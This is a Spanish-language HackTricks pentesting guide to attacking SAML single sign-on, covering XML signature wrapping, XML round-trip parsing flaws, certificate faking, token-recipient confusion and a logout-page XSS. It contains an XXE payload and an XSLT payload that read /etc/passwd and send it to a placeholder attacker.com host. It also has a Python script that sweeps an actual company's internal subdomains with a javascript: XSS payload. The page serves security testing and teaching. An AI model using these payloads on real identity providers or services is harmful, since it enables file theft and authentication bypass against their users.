# Ataques SAML

## Ataques SAML

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci√≥n b√°sica

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Gr√°fico de ataques

![](<../../.gitbook/assets/image (535) (1) (1) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (6).png>)

## Herramienta

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): Una herramienta que puede tomar una URL o una lista de URL y devuelve la URL de consumo de SAML.

## Ronda de XML

En XML, la parte firmada del XML se guarda en memoria, luego se realiza una codificaci√≥n/decodificaci√≥n y se verifica la firma. Idealmente, esa codificaci√≥n/decodificaci√≥n no deber√≠a cambiar los datos, pero en ese escenario, **los datos que se verifican y los datos originales podr√≠an no ser los mismos**.

Por ejemplo, comprueba el siguiente c√≥digo:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
  <Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
Ejecutar el programa contra REXML 3.2.4 o una versi√≥n anterior resultar√≠a en la siguiente salida en su lugar:
```
First child in original doc: Y
First child after round-trip: Z
```
As√≠ es como REXML vio el documento XML original del programa anterior:

![](<../../.gitbook/assets/image (561).png>)

Y as√≠ es como lo vio despu√©s de una ronda de an√°lisis y serializaci√≥n:

![](<../../.gitbook/assets/image (562).png>)

Para obtener m√°s informaci√≥n sobre la vulnerabilidad y c√≥mo abusar de ella:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## Ataques de envoltura de firma XML

Los documentos XML que contienen firmas XML se procesan t√≠picamente en dos pasos independientes: validaci√≥n de firma e invocaci√≥n de funci√≥n (l√≥gica empresarial). Si ambos m√≥dulos tienen diferentes vistas de los datos, existe una nueva clase de vulnerabilidades llamada ataques de envoltura de firma XML (XSW).\
En estos ataques, el atacante modifica la estructura del mensaje inyectando elementos falsificados que no invalidan la firma XML. El objetivo de esta alteraci√≥n es cambiar el mensaje de tal manera que la l√≥gica de la aplicaci√≥n y el m√≥dulo de verificaci√≥n de firma utilicen diferentes partes del mensaje. En consecuencia, el receptor verifica la firma XML correctamente, pero la l√≥gica de la aplicaci√≥n procesa el elemento falso. El atacante as√≠ evita la protecci√≥n de integridad y la autenticaci√≥n de origen de la firma XML e puede inyectar contenido arbitrario.

Desde la solicitud SAML:

![](<../../.gitbook/assets/image (537).png>)

### XSW #1

Un atacante puede agregar un nuevo elemento ra√≠z donde se encuentra la firma. Por lo tanto, cuando el validador verifica la integridad de la firma, puede notar que ha verificado la integridad de la ruta Response -> Assertion -> Subject, y puede confundirse con la nueva ruta maliciosa Response -> Assertion -> Subject en rojo y usar sus datos.

![](<../../.gitbook/assets/image (538).png>)

### XSW #2

La diferencia con #1 es que el tipo de firma utilizado es una firma separada donde XSW #1 utiliz√≥ una firma de envoltura.\
Observe c√≥mo la nueva estructura maliciosa es la misma que antes, tratando de confundir la l√≥gica empresarial despu√©s de que se realiz√≥ la verificaci√≥n de integridad.

![](<../../.gitbook/assets/image (539).png>)

### XSW #3

En este ataque se crea una Assertion maliciosa en el mismo nivel que la Assertion original para tratar de confundir la l√≥gica empresarial y usar los datos maliciosos.

![](<../../.gitbook/assets/image (540).png>)

### XSW #4

XSW #4 es similar a #3, excepto que en este caso la Assertion original se convierte en un hijo de la Assertion copiada.

![](<../../.gitbook/assets/image (541).png>)

### XSW #5

En XSW #5, la firma y la Assertion original no est√°n en una de las tres configuraciones est√°ndar (envuelta/envolvente/separada). En este caso, la Assertion copiada envuelve la firma.

![](<../../.gitbook/assets/image (542).png>)

### XSW #6

XSW #6 inserta su Assertion copiada en la misma ubicaci√≥n que las #4 y #5. La pieza interesante aqu√≠ es que la Assertion copiada envuelve la firma, que a su vez envuelve la Assertion original.

![](<../../.gitbook/assets/image (543).png>)

### XSW #7

XSW #7 inserta un elemento Extensions y agrega la Assertion copiada como hijo. Extensions es un elemento XML v√°lido con una definici√≥n de esquema menos restrictiva. Los autores de este [documento t√©cnico](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf) desarrollaron este m√©todo en respuesta a la biblioteca OpenSAML. OpenSAML utiliz√≥ la validaci√≥n de esquema para comparar correctamente el ID utilizado durante la validaci√≥n de firma con el ID de la Assertion procesada. Los autores descubrieron que en los casos en que las Assertions copiadas con el mismo ID de la Assertion original eran hijos de un elemento con una definici√≥n de esquema menos restrictiva, pudieron evitar esta contramedida en particular.

![](<../../.gitbook/assets/image (544).png>)

### XSW #8

XSW #8 utiliza otro elemento XML menos restrictivo para realizar una variaci√≥n del patr√≥n de ataque utilizado en XSW #7. En esta ocasi√≥n, la Assertion original es el hijo del elemento menos restrictivo en lugar de la Assertion copiada.

![](<../../.gitbook/assets/image (545).png>)

### Herramienta

Puede utilizar la extensi√≥n de Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) para analizar la solicitud, aplicar cualquier ataque XSW que elija y lanzarlo.

![](<../../.gitbook/assets/image (546).png>)

### Documento original

Para obtener m√°s informaci√≥n sobre este ataque, lea el documento original en [https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)

## XXE

Si no sabe qu√© tipo de ataques son XXE, lea la siguiente p√°gina:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

Debido a que las respuestas SAML son documentos XML comprimidos y codificados en base64, podemos probar XXE manipulando el documento XML enviado como respuesta SAML. Ejemplo:
```markup
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY    file SYSTEM "file:///etc/passwd">
   <!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
  <samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
  <saml:Issuer>...</saml:Issuer>
  <ds:Signature ...>
    <ds:SignedInfo>
      <ds:CanonicalizationMethod .../>
      <ds:SignatureMethod .../>
      <ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
[...]
```
### Herramienta

Tambi√©n puedes utilizar la extensi√≥n de Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) para generar la prueba de concepto a partir de una solicitud SAML y probar posibles vulnerabilidades XXE.

Revisa tambi√©n esta charla: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT a trav√©s de SAML

Para obtener m√°s informaci√≥n sobre XSLT, consulta:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md](../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md)
{% endcontent-ref %}

La Transformaci√≥n de Lenguaje de Hojas de Estilo Extensible (XSLT) es un lenguaje Turing completo para transformar documentos XML en otros tipos de documentos como HTML, JSON o PDF. Un aspecto importante a tener en cuenta aqu√≠ es que **el ataque no requiere una firma v√°lida para tener √©xito**. La raz√≥n de esto es que **la transformaci√≥n XSLT ocurre antes de que se procese la firma digital para su verificaci√≥n**. B√°sicamente, necesitamos una respuesta SAML firmada para realizar el ataque, pero la firma puede ser auto-firmada o inv√°lida.

![xslt](https://epi052.gitlab.io/notes-to-self/img/saml/xslt.png)

Aqu√≠ puedes encontrar una **prueba de concepto** para comprobar este tipo de vulnerabilidades, en la p√°gina de hacktricks mencionada al principio de esta secci√≥n puedes encontrar cargas √∫tiles.
```markup
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```
### Herramienta

Tambi√©n puedes utilizar la extensi√≥n de Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) para generar la POC a partir de una solicitud SAML para probar posibles vulnerabilidades XSLT.

Revisa tambi√©n esta charla: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## Exclusi√≥n de firma XML <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

La exclusi√≥n de firma se utiliza para probar c√≥mo se comporta la implementaci√≥n de SAML cuando **no hay un elemento de firma**. Cuando falta un elemento de firma, es posible que se omita completamente el paso de validaci√≥n de firma. Si la firma no se valida, cualquier contenido que normalmente se firmar√≠a puede ser manipulado por un atacante.

![](<../../.gitbook/assets/image (547).png>)

### Herramienta <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

La exclusi√≥n de firma comienza interceptando la respuesta SAML y luego haciendo clic en `Remove Signatures`. Al hacerlo, se eliminan **todos** los elementos de firma.

![sig-exclusion](https://epi052.gitlab.io/notes-to-self/img/saml/sig-exclusion.png)

Con las firmas eliminadas, permita que la solicitud se env√≠e al destino. Si el servicio no requiere la firma

## Falsificaci√≥n de certificados <a href="#certificate-faking" id="certificate-faking"></a>

La falsificaci√≥n de certificados es el proceso de probar si el proveedor de servicios **verifica que un proveedor de identidad de confianza firm√≥ el mensaje SAML**. La relaci√≥n de confianza entre SP e IdP se establece y **debe ser verificada** cada vez que se recibe un mensaje SAML. Lo que esto significa es que se utiliza un certificado **auto-firmado** para firmar la respuesta o afirmaci√≥n SAML.

### Herramienta <a href="#certificate-faking-how-to" id="certificate-faking-how-to"></a>

Se utilizar√° la extensi√≥n de Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e).\
Para falsificar un certificado, comience interceptando la respuesta SAML.\
Si hay una firma incluida en la respuesta, use el bot√≥n `Send Certificate to SAML Raider Certs`.

![send-cert](https://epi052.gitlab.io/notes-to-self/img/saml/send-cert.png)

Despu√©s de enviar el certificado, deber√≠amos ver un certificado importado en la pesta√±a Certificados de SAML Raider. Una vez all√≠, resaltamos el certificado importado y presionamos el bot√≥n `Save and Self-Sign`.

![sent-cert](https://epi052.gitlab.io/notes-to-self/img/saml/sent-cert.png)

Al hacerlo, se genera un clon auto-firmado del certificado original. Ahora es el momento de volver a la solicitud interceptada que a√∫n se encuentra en el Proxy de Burp. Primero, seleccione el nuevo certificado auto-firmado del men√∫ desplegable de firma XML. Luego use el bot√≥n `Remove Signatures` para eliminar cualquier firma existente. Finalmente, use el bot√≥n **`(Re-)Sign Message`** o `(`**`Re-)Sign Assertion`** (**el que sea m√°s apropiado** en su situaci√≥n dada).

![remove-sig](https://epi052.gitlab.io/notes-to-self/img/saml/remove-sig.png)

Despu√©s de firmar el mensaje con el certificado auto-firmado, env√≠elo a su destino. Si nos autenticamos, sabemos que podemos firmar nuestros mensajes SAML. La capacidad de firmar nuestros mensajes SAML significa que podemos cambiar los valores en la afirmaci√≥n y ser√°n aceptados por el proveedor de servicios.

## Confusi√≥n del destinatario del token / Confusi√≥n del objetivo del proveedor de servicios <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

La confusi√≥n del destinatario del token / Confusi√≥n del objetivo del proveedor de servicios **prueba si el proveedor de servicios valida el destinatario**. Esto significa que si la respuesta estaba destinada a un proveedor de servicios diferente, el proveedor de servicios **actual** deber√≠a notarlo y **rechazar la autenticaci√≥n**.\
El campo **Destinatario** es un atributo del elemento **SubjectConfirmationData**, que es un hijo del elemento Subject en una respuesta SAML.

> El elemento SubjectConfirmationData especifica datos adicionales que permiten confirmar el sujeto o limitar las circunstancias en las que puede tener lugar el acto de confirmaci√≥n del sujeto. La confirmaci√≥n del sujeto tiene lugar cuando un partido que conf√≠a busca verificar la relaci√≥n entre una entidad que presenta la afirmaci√≥n (es decir, la entidad que atestigua) y los reclamos del sujeto de la afirmaci√≥n.

El atributo Destinatario que se encuentra en el **elemento SubjectConfirmationData es una URL que especifica la ubicaci√≥n a la que se debe entregar la afirmaci√≥n**. Si el destinatario es un proveedor de servicios diferente al que lo recibe, la afirmaci√≥n no debe ser aceptada.

### C√≥mo hacerlo <a href="#token-recipient-confusion-how-to" id="token-recipient-confusion-how-to"></a>

La confusi√≥n del destinatario del token SAML (SAML-TRC) tiene algunas condiciones previas para que intentemos la explotaci√≥n. Primero, **necesitamos tener una cuenta leg√≠tima en un proveedor de servicios**. En segundo lugar, **SP-Target debe aceptar tokens emitidos por el mismo proveedor de identidad que atiende a SP-Legit**.

El ataque es relativamente simple si las condiciones son verdaderas. Nos **autenticamos** en **SP-Legit** a trav√©s del proveedor de identidad compartido. Luego **interceptamos la respuesta SAML en su camino desde IdP a SP-Legit**. Una vez interceptado, enviamos la **respuesta SAML que estaba destinada a SP-Legit a SP-Target en su lugar**. Si **SP-Target acepta la afirmaci√≥n**; nos encontraremos con la sesi√≥n iniciada con el mismo nombre de cuenta que tenemos para SP-Legit y obtendremos acceso a los recursos correspondientes de SP-Target.

## XSS en la funcionalidad de cierre de sesi√≥n

(Accede a la [investigaci√≥n original aqu√≠](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/))

Despu√©s de realizar la fuerza bruta de directorios, encontr√© la siguiente p√°gina:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
Es una p√°gina de cierre de sesi√≥n, abr√≠ el enlace de arriba y me redirigi√≥ a la siguiente p√°gina.
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
El par√°metro base toma una URL, as√≠ que ¬øqu√© tal si lo reemplazamos con el cl√°sico `javascript:alert(123);` para desencadenar un XSS?

### Explotaci√≥n masiva

Usando [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor), que puede tomar una lista de URLs y luego devolverte la URL de devoluci√≥n de llamada (consumo de SAML), decid√≠ alimentar la herramienta con todos los subdominios de `uberinternal.com` para ver si hay otros dominios que usan la misma biblioteca y los hab√≠a.

Lo que hice a continuaci√≥n fue crear un script que llama a la p√°gina vulnerable `oidauth/prompt` e intenta el XSS y si mi entrada se refleja, me da un mensaje vulnerable agradable.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
            for url in urlList:
                url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
                request = requests.get(url2, allow_redirects=True,verify=False)
                doesit = Fore.RED + "no"
                if ("Fady" in request.content):
                    doesit = Fore.GREEN + "yes"
                print(Fore.WHITE + url2)
                print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## Referencias

Los ataques fueron obtenidos de [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
Puedes encontrar recursos adicionales y write-ups en [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
